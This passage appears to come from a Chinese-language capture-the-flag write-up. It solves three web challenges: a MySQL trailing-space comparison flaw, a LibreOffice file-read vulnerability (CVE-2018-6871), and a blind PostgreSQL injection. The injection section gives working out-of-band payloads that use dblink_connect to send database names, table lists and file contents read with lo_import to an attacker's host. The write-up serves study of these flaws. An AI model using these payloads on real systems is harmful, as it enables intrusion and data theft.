      if ($res->fetch_assoc() !== null) {
        $valid = true;
      }
      $statement->close();
      return $valid;
    }
/db.php::get_product源码如下：
    function get_product($name) {
      global $db;
      $statement = $db->prepare(
        "SELECT name, description FROM products WHERE name = ?"
      );
      check_errors($statement);
      $statement->bind_param("s", $name);
      check_errors($statement->execute());
      $res = $statement->get_result();
      check_errors($res);
      $product = $res->fetch_assoc();
      $statement->close();
      return $product;
    }
check的时候会将name和secret一并查询，但返回product时只查询name，所以此时便有了可利用点  
这里涉及到mysql的一个问题，查询的时候将会忽略字符串尾部的空格  
于是我们可以添加一个facebook尾部带n个空格的product，添加成功后再进行查询，便能得到flag
### pdfme
只能上传`.fods`文件，在网上找了个：
                            TEXT
他会渲染为pdf：
将pdf下载下来，利用exiftool查看文件信息：  
注意到 **libreoffice** ，查找相关漏洞，最后落到了[CVE-2018-6871](https://www.exploit-db.com/exploits/44022)，差不多是协议的问题：
> For protocols that are not supported, such as ftp: // or file: //,
> WEBSERVICE returns the #VALUE! error value.
>
> In LibreOffice, these restrictions are not implemented before 5.4.5/6.0.1
将`table:table-cell`这一部分进行替换，改为：
           #VALUE!
得到：  
根据给出的用户，于是我们尝试查询`/home/libreoffice_admin/flag`,最终读到flag  
### hr_admin_module
题目描述：
> While tying down the application the developer may have had trouble revoking
> the permission on one or two functions. Let's hope this got sorted. At least
> he made sure the site feels really fast.
>
> 
有两个搜索框，从error似乎给出了一些提示，数据库为`postgresql`，`user`框禁止了输入，于是尝试利用`employees`框，但没卵用，关注地址栏：  
尝试将`employee`改为`user`，输入`admin'`，奏效了，弹出warning：
> This is a warning alert—check it out!
尝试输入`secret`，同样弹出上述警报  
输入`admin%27--`，无警报
fuzz一阵，会发现回显只有有无warning的区别，但尝试利用`pg_sleep`，返回结果没有时延，所以我们可以猜测后台是异步执行，且一般盲注不起效果
**带外注入（OOB）：**
>
> 带外通道技术(OOB)让攻击者能够通过另一种方式来确认和利用所谓的盲目(blind)的漏洞。在这种盲目的漏洞中，攻击者无法通过恶意请求直接在响应包中看到漏洞的输出结果。带外通道技术通常需要脆弱的实体来生成带外的TCP/UDP/ICMP请求，然后，攻击者可以通过这个请求来提取数据。一次OOB攻击能够成功是基于防火墙出站规则的，即允许存在漏洞的系统和外围防火墙的出站请求
我们大致有两种方式：
  1. dnslog，搭建dns服务器，将域名指向自己的服务器，利用dns进行解析，然后请求自己的二级或三级域名，在dns解析日志中去查看他们
  2. 因为`dblink_connect`可用，我们可以尝试搭建一个`postgresql`服务，然后建立一个远程会话连接，连接到我们的`psql`服务，监听服务端口，查看请求包的明文信息
第二个方法似乎更为简单
`dblink`是一个支持在一个数据库会话中连接到其他PostgreSQL数据库的模块。  
`dblink_connect` \-- 打开一个到远程数据库的持久连接
在自己的服务器上安装`postgresql`，在配置文件`postgresql.conf`中设置：
    listen_addresses = '*'
利用tcpdump监听`5432`端口，查看请求包的信息：
    tcpdump -nX -i eth0 port 5432
postgresql安装后默认用户为`postgres`，无密码，且有一个`postgres`的数据库，有意思的一点是，建议将密码或用户参数填写错误，因为这样才能返回查询信息
修改payload：
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=postgres password= dbname=postgres')) --
携带了连接信息：  
列出schema：
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(schema_name,':') FROM information_schema.schemata) || ' password=postgres dbname=postgres')) --
> String_agg：有两个参数一个是需要合并的字段名称或者字面量，还有就是合并后以何种分隔符，即：string_agg(expression,
> delimiter)。
列出当前schema的table：
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(tablename, ':') FROM pg_catalog.pg_tables WHERE schemaname=current_schema()) || ' password=postgres dbname=postgres')) --
列出searches的行数
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT COUNT(*) FROM searches) || ' password=postgres dbname=postgres')) --
发现为空，说明没有内容  
由于`pg_read_file`不能用，我们可以使用`lo_import`将文件的内容加载到`pg_largeobject`目录中。如果查询成功，我们将获得对象的`oid`。
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT lo_import('/var/lib/postgresql/data/secret')) || ' password=postgres dbname=postgres')) --
成功了！！！
每个文件都可以对应于一个oid  
我们可以通过从pg_largeobject_metadata中提取来获取可用对象的oid列表
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT string_agg(cast(l.oid as text), ':') FROM pg_largeobject_metadata l) || ' password=postgres dbname=postgres')) --
我们尝试挨个读取，最终在`16444`读到了flag内容
    a' UNION SELECT 1,(SELECT dblink_connect('host=IP user=' || (SELECT convert_from(lo_get(16444), 'UTF8')) || ' password=postgres dbname=postgres')) --